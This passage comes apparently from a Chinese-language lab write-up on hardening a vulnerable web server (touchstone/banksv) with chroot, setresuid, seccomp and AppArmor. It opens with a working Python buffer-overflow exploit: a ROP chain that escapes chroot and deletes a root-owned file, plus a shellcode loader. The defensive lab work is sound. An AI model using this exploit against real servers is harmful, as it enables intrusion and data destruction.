127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 下面的Content-Length是有用的，取决于 </span></span><br><span class="line">    <span class="comment"># 用户名加密码的长度，您需要使用wireshark（与Web浏览器一起） </span></span><br><span class="line">    <span class="comment"># 检查长度</span></span><br><span class="line">    req += (<span class="string">&quot;Content-Length: 58\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>) </span><br><span class="line">    req += (<span class="string">&quot;Origin: http://127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    req += (<span class="string">&quot;Connection: keep-alive\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    req += (<span class="string">&quot;Referer: http://127.0.0.1/\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    req += (<span class="string">&quot;Hacking: &quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对于不同的操作系统（和编译），填充的长度 </span></span><br><span class="line">    <span class="comment"># 劫持栈中返回地址的长度可能不同，</span></span><br><span class="line">    <span class="comment"># 因此您需要调试程序以检查和调整。</span></span><br><span class="line"></span><br><span class="line">    req += <span class="string">b&#x27;A&#x27;</span> * <span class="number">1068</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用监狱破坏删除文件</span></span><br><span class="line">    req += p32(chr_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chr_arg2_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(chd_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chd_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(chd_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chd_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(chr_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chr_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(ul_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(ul_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(ex_addr)</span><br><span class="line">    req += p32(<span class="number">0</span>)</span><br><span class="line">    req += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 19 * 4</span></span><br><span class="line">    req += chd_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 19 * 4 + 4</span></span><br><span class="line">    req += chr_arg2.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 16 * 4 + 12</span></span><br><span class="line">    req += chr_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 16 * 4 + 16</span></span><br><span class="line">    req += ul_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">   </span><br><span class="line">    <span class="comment"># 以下是您可以通过Web浏览器注册到Web服务器的用户名/密码</span></span><br><span class="line">    <span class="comment"># 这些信息将存储在后面的sqlite数据库中。</span></span><br><span class="line">    <span class="comment"># 您需要根据自己的注册更改这些信息。</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 请注意，成功的POST将由服务器以提示页面响应。</span></span><br><span class="line">    <span class="comment"># 通过使用成功的响应，您可以判断服务器是否已 </span></span><br><span class="line">    <span class="comment"># 崩溃（通过利用），以便您可以相应地调整填充。</span></span><br><span class="line">    req += (<span class="string">&quot;login_username=lixiang&amp;login_password=123456&amp;submit_login=Login&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(req)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line">    <span class="comment">#req += (addr1).to_bytes(4, byteorder=&#x27;little&#x27;)</span></span><br><span class="line">    <span class="comment">#req += (&quot;@@@@&quot;).encode(&#x27;latin-1&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_req</span>(<span class="params">host, port, req</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connecting to %s:%d...&quot;</span> % (host, port))</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connected, sending request...&quot;</span>)</span><br><span class="line">    sock.send(req)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request sent, waiting for reply...&quot;</span>)</span><br><span class="line">    rbuf = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    resp = (<span class="string">&quot;&quot;</span>).encode(<span class="string">&quot;latin-1&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(rbuf):</span><br><span class="line">      resp=resp+rbuf</span><br><span class="line">      rbuf = sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Received reply.&quot;</span>)</span><br><span class="line">    sock.close()</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(os.path.exists(<span class="string">&quot;shellcode.bin&quot;</span>)):</span><br><span class="line">      shellfile = <span class="built_in">open</span>(<span class="string">&quot;shellcode.bin&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">      shellcode = shellfile.read()</span><br><span class="line">    req = build_exploit(shellcode)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP request:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req)</span><br><span class="line"></span><br><span class="line">    resp = send_req(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">80</span>, req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP response:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(resp)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Exception:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(traceback.format_exc())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="防御结果分析">防御结果分析</h3><p><code>chroot</code>是一种用于更改当前进程及其子进程的根目录的技术。通过<code>chroot</code>，进程及其子进程可以限制在特定的目录树中，防止它们访问目录树之外的文件和资源。这种技术通常用于增强系统安全性，特别是隔离服务程序（如Web服务器），以限制潜在攻击影响的范围。</p><p><code>chroot</code>更改调用进程的根目录，使进程认为指定的目录是文件系统的根目录<code>/</code>。这样，进程无法访问该目录之外的任何文件或目录，从而在一定程度上实现进程隔离。</p><h2 id="更改进程euid测试攻击">更改进程euid，测试攻击</h2><h3 id="实验环境配置-2">实验环境配置</h3><p>为了避免影响之前实验的结果，将代码目录复制到code_euid。当然，仍然需要禁用地址随机化以避免地址变化。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_euid</span><br></pre></td></tr></table></figure><h3 id="执行euid配置">执行euid配置</h3><p>在server.c中的fork子进程代码位置添加以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setresuid</span>(<span class="number">1000</span>,<span class="number">1000</span>,<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;User IDs successfully set to 1000.\n&quot;</span>);</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619153144782.png"alt="image-20240619153144782" /><figcaption aria-hidden="true">image-20240619153144782</figcaption></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make  </span><br><span class="line">sudo chown root touchstone  </span><br><span class="line">sudo chmod +s touchstone  </span><br></pre></td></tr></table></figure><h3 id="执行攻击测试-1">执行攻击测试</h3><p>创建测试文件然后启动服务器，发现成功打印了”User IDs successfully setto 1000”信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在tmp目录中创建测试文件</span>  </span><br><span class="line">sudo touch /tmp/test.txt</span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务器</span></span><br><span class="line">./touchstone</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619153651371.png"alt="image-20240619153651371" /><figcaption aria-hidden="true">image-20240619153651371</figcaption></figure><p>执行脚本。由于与任务一没有区别且地址没有变化，直接使用exploit_1.py。</p><p>进行shell获取测试，发现可以获取shell，但处于非特权模式。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit_1.py 1 # 尝试获取shell</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621144856371.png"alt="image-20240621144856371" /><figcaption aria-hidden="true">image-20240621144856371</figcaption></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit_1.py 2 # 尝试删除文件</span><br></pre></td></tr></table></figure><p>进行文件删除测试，发现<code>/tmp/test.txt</code>文件仍然存在且未被删除。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619153901043.png"alt="image-20240619153901043" /><figcaption aria-hidden="true">image-20240619153901043</figcaption></figure><p>我们可以尝试将该文件的所有者修改为自己，看看是否可以删除。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改测试文件所有者</span></span><br><span class="line">sudo chown lixiang:root /tmp/test.txt</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619154643560.png"alt="image-20240619154643560" /><figcaption aria-hidden="true">image-20240619154643560</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619161636645.png"alt="image-20240619161636645" /><figcaption aria-hidden="true">image-20240619161636645</figcaption></figure><h3 id="防御结果分析-1">防御结果分析</h3><p>此防御主要通过降低服务器启动的3个子进程的权限来防止恶意操作作为高权限用户。从上述结果中，我们还可以发现，在主动放弃root权限后，无法删除root拥有的文件，但当文件所有者更改为lixiang（普通用户）时，测试文件可以正常删除。我们还发现一个现象，即使文件的用户组是root，仍然可以删除，表明在删除文件时与用户组无关，而与文件所有者有关。</p><h2id="使用seccomp约束web服务器的漏洞进程测试攻击">使用seccomp约束Web服务器的漏洞进程，测试攻击</h2><h3 id="实验环境配置-3">实验环境配置</h3><p>同样复制代码以创建一个新的code_seccomp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_seccomp</span><br></pre></td></tr></table></figure><p>可以使用以下命令检查内核是否启用了seccomp：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查是否启用了seccomp支持：</span> </span><br><span class="line">grep CONFIG_SECCOMP= /boot/config-$(uname -r) </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查是否启用了seccomp过滤器：</span> </span><br><span class="line">grep CONFIG_SECCOMP_FILTER= /boot/config-$(uname -r) </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619164635614.png"alt="image-20240619164635614" /><figcaption aria-hidden="true">image-20240619164635614</figcaption></figure><p>如果输出为：<code>CONFIG_SECCOMP=y</code>和<code>CONFIG_SECCOMP_FILTER=y</code>，则表示内核已启用seccomp。要检查特定进程是否启用了seccomp，请使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/&lt;pid&gt;/status | grep Seccomp</span><br></pre></td></tr></table></figure><p>其中<pid>表示进程PID，可以使用<code>ps -au</code>查看。如果输出包含Seccomp字段，则表示该进程使用seccomp。如果没有此字段，则表示该进程未使用seccomp。</p><p>修改makefile文件，为banksv的编译选项添加<code>-lseccomp</code></p><figure><imgsrc="https://picx.zhimg.com/80/v2-6adab4a46975fe018a720b338dd9ecf5_720w.png"alt="image-20240619170121404" /><figcaption aria-hidden="true">image-20240619170121404</figcaption></figure><p>发现添加了一个额外的libseccomp.so.2库，因此libc.so.6的基地址发生了变化，只需在脚本中修改。</p><figure><imgsrc="https://pic1.zhimg.com/80/v2-0b7bc536cb3bbe375efa7e95c045f93d_720w.png"alt="image-20240619173424478" /><figcaption aria-hidden="true">image-20240619173424478</figcaption></figure><h3 id="执行seccomp编码">执行seccomp编码</h3><h4 id="默认允许显式拒绝">默认允许，显式拒绝</h4><p>修改banksv.c，添加以下代码，使用默认允许规则初始化，并添加拒绝unlink的规则，然后加载seccomp。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619165715018.png"alt="image-20240619165715018" /><figcaption aria-hidden="true">image-20240619165715018</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span>  </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_seccomp</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="type">int</span> ret;  </span><br><span class="line">    scmp_filter_ctx ctx = <span class="built_in">seccomp_init</span>(SCMP_ACT_ALLOW);  </span><br><span class="line">    <span class="keyword">if</span>(ctx == <span class="literal">NULL</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">    ret = <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="built_in">SCMP_SYS</span>(unlink), <span class="number">0</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">    ret = <span class="built_in">seccomp_load</span>(ctx);  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">    <span class="built_in">seccomp_release</span>(ctx);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;  </span><br><span class="line">    …  </span><br><span class="line">    <span class="built_in">init_seccomp</span>();  </span><br><span class="line">    …  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>编译并运行服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo make  </span><br><span class="line">sudo chown root touchstone  </span><br><span class="line">sudo chmod +s touchstone  </span><br><span class="line">sudo ./touchstone  </span><br></pre></td></tr></table></figure><h4 id="默认拒绝显式允许">默认拒绝，显式允许</h4><p>修改banksv.c，添加以下代码，默认拒绝所有规则，并添加允许规则，然后加载seccomp。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619172906034.png"alt="image-20240619172906034" /><figcaption aria-hidden="true">image-20240619172906034</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_deny_bydefault_rules</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> ret;  </span><br><span class="line">  scmp_filter_ctx ctx = <span class="built_in">seccomp_init</span>(SCMP_ACT_KILL);  </span><br><span class="line">  <span class="keyword">if</span>(ctx == <span class="literal">NULL</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">      </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(read), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(write), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(openat), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(rt_sigaction), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(socketcall), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(clone), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(set_robust_list), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(getresuid32), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(getcwd), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(getpid), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(statx), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(close), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(_llseek), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fcntl64), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(access), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(brk), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(exit_group), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fchmod), <span class="number">0</span>); </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(stat64), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fstat64), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(geteuid32), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fchown32), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fsync), <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 攻击程序所需的权限</span></span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(system), <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(unlink), <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  ret = <span class="built_in">seccomp_load</span>(ctx);  </span><br><span class="line">  <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">  <span class="built_in">seccomp_release</span>(ctx);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并运行服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo make  </span><br><span class="line">sudo chown root touchstone  </span><br><span class="line">sudo chmod +s touchstone  </span><br><span class="line">sudo ./touchstone  </span><br></pre></td></tr></table></figure><h3 id="执行攻击测试-2">执行攻击测试</h3><h4 id="默认允许显式拒绝-1">默认允许，显式拒绝</h4><p>首先创建测试文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /tmp/test.txt  </span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure><p>文件删除和获取shell均失败，并且会弹出系统错误报告。具体结果如下，dmesg内核消息中出现两个审计日志。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619172118447.png"alt="image-20240619172118447" /><figcaption aria-hidden="true">image-20240619172118447</figcaption></figure><p>这种方法会带来负面影响，例如无法注册和连接重置。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619171801241.png"alt="image-20240619171801241" /><figcaption aria-hidden="true">image-20240619171801241</figcaption></figure><h4 id="默认拒绝显式允许-1">默认拒绝，显式允许</h4><p>首先创建测试文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /tmp/test.txt  </span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure><p>文件删除和获取shell均失败，结果如下：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621133745249.png"alt="image-20240621133745249" /><figcaption aria-hidden="true">image-20240621133745249</figcaption></figure><p>在AI的帮助下，审计日志的含义如下</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621134819072.png"alt="image-20240621134819072" /><figcaption aria-hidden="true">image-20240621134819072</figcaption></figure><p>但我觉得这更麻烦，必须确定需要使用哪些系统调用，个人认为不如前一种好。</p><h3 id="防御结果分析-2">防御结果分析</h3><p>seccomp（全名安全计算模式）是一种沙箱安全机制。在Linux系统中，大量系统调用直接暴露给用户空间程序。然而，并非所有系统调用都是必需的，不安全的代码滥用系统调用可能对系统构成安全威胁。通过seccomp，<strong>限制程序使用某些系统调用</strong>，可以减少系统的攻击面，并将程序置于“安全”状态，类似于<strong>系统调用的防火墙</strong>。</p><h2id="使用apparmor约束web服务器的漏洞进程测试攻击">使用AppArmor约束Web服务器的漏洞进程，测试攻击</h2><h3 id="实验环境配置-4">实验环境配置</h3><p>使用cp创建一个新的代码目录code_apparmor，然后需要启动apparmor并安装相关工具。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_apparmor</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装AppArmor和相关工具</span> </span><br><span class="line">sudo systemctl start apparmor</span><br><span class="line">sudo apt install apparmor-profiles apparmor-utils </span><br></pre></td></tr></table></figure><h3 id="应用apparmor">应用AppArmor</h3><p>在服务器启动运行后，使用aa-genprof为banksv生成配置文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./touchstone </span><br><span class="line"></span><br><span class="line">sudo aa-genprof banksv</span><br></pre></td></tr></table></figure><p>按F跳过，并结合aa-logprof手动添加规则以改进配置文件。配置文件路径为<code>/etc/apparmor.d/home.lixiang.Desktop.lab2.code_apparmor.banksv</code>。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619184538978.png"alt="image-20240619184538978" /><figcaption aria-hidden="true">image-20240619184538978</figcaption></figure><p>打开配置文件并写入以下内容：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619185627994.png"alt="image-20240619185627994" /><figcaption aria-hidden="true">image-20240619185627994</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 最后修改时间：2024年6月19日03:45:02</span><br><span class="line">#include &lt;tunables/global&gt;</span><br><span class="line"></span><br><span class="line">/home/lixiang/Desktop/lab2/code_apparmor/banksv &#123;</span><br><span class="line"></span><br><span class="line">  # 包含apache2-common和基本抽象，这些抽象包含一些常见的权限设置。</span><br><span class="line">  include &lt;abstractions/apache2-common&gt;  </span><br><span class="line">  include &lt;abstractions/base&gt;  </span><br><span class="line">  </span><br><span class="line">  # 拒绝对/tmp目录中任何文件的读/写操作  </span><br><span class="line">  deny /tmp/** mrwx,  </span><br><span class="line"></span><br><span class="line">  # 允许对code_task5目录中所有文件的只读访问</span><br><span class="line">  /home/lixiang/Desktop/lab2/code_apparmor/** mr,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新加载配置文件以使上述配置文件生效：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apparmor_parser -r /etc/apparmor.d/home.lixiang.Desktop.lab2.code_apparmor.banksv</span><br></pre></td></tr></table></figure><h3 id="执行攻击测试-3">执行攻击测试</h3><p>首先创建测试文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 